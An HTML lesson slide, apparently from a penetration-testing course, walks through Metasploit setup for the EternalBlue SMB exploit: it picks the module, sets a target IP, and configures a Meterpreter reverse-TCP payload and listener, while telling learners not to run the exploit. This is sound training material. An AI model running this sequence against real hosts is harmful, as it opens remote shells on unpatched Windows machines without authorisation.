@@ -1,0 +1,73 @@
+<div class="h-full w-full flex flex-col p-5 relative overflow-hidden cohortia-bg" data-theme="light">
+  <div class="flex items-center gap-2 text-[10px] font-bold uppercase tracking-wider text-slate-500 mb-4">
+    <span class="px-2 py-1 rounded-md bg-blue-50 text-blue-700 border border-blue-100">Module 08</span>
+    <span>›</span>
+    <span>Chapter 8.3</span>
+    <span>›</span>
+    <span class="text-slate-700">msfconsole Walkthrough</span>
+  </div>
+
+  <div class="flex gap-6 h-full">
+    <div class="w-1/2 rounded-2xl bg-white p-6 shadow-sm border border-[rgba(226,232,240,0.9)] h-full overflow-hidden">
+      <div class="text-lg font-semibold text-slate-800">Terminal demo (read-only)</div>
+      <div class="text-sm text-slate-600 mt-2">A canonical setup sequence used to prepare an exploit. Do not run exploit here; this is preparation only.</div>
+
+      <pre class="mt-4 bg-slate-900 text-slate-100 rounded-lg p-4 text-sm overflow-auto" style="white-space:pre-wrap; tab-size:2; font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, monospace;">
+# Start Metasploit console
+msfconsole
+
+# Search for an exploit (e.g., eternalblue)
+search eternalblue
+
+# Select a module
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Show required options
+show options
+
+# Set the target host
+set RHOSTS 192.168.1.101
+
+# Show available payloads
+show payloads
+
+# Choose a payload and set listener
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+
+# Do NOT run 'exploit' in this exercise
+</pre>
+
+      <div class="mt-3 rounded-lg p-3 bg-white border border-[rgba(226,232,240,0.9)]">
+        <div class="font-semibold text-slate-800">Explanation</div>
+        <ul class="text-sm text-slate-700 mt-2 list-disc pl-5 space-y-1">
+          <li>Search locates candidate modules by keyword or vulnerability ID.</li>
+          <li>show options reveals parameters you must set before running a module.</li>
+          <li>Choosing the right payload determines the kind of session you receive if exploitation succeeds.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="w-1/2 rounded-2xl bg-white p-6 shadow-sm border border-[rgba(226,232,240,0.9)] h-full overflow-auto">
+      <div class="text-lg font-semibold text-slate-800">Supporting cards</div>
+
+      <div class="grid grid-cols-1 gap-3 mt-4">
+        <div class="rounded-lg p-3 bg-violet-50 border border-[rgba(226,232,240,0.9)]">
+          <div class="font-semibold text-slate-800">Concrete example</div>
+          <div class="text-sm text-slate-700 mt-1">Setting RHOSTS to 192.168.1.101 and LHOST to your attacking IP configures the channel for a reverse session without executing the exploit.</div>
+        </div>
+
+        <div class="rounded-lg p-3 bg-white border border-[rgba(226,232,240,0.9)]">
+          <div class="font-semibold text-slate-800">Misconception check</div>
+          <div class="text-sm text-slate-700 mt-1">A module existing in the database doesn’t imply the target matches the expected environment; verify banners and versions first.</div>
+        </div>
+
+        <div class="rounded-lg p-3 bg-emerald-50 border border-[rgba(226,232,240,0.9)]">
+          <div class="text-[10px] font-bold uppercase tracking-wider text-emerald-700 mb-1">Key Takeaway</div>
+          <p class="text-xs font-medium text-slate-800">Prepare and confirm configuration fully before any attempt to exploit; double-check scope and targets.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+<style>pre, code, [class*="code"], [class*="editor"], [class*="snippet"], [class*="source"] { white-space: pre-wrap; tab-size: 2; }</style></div>
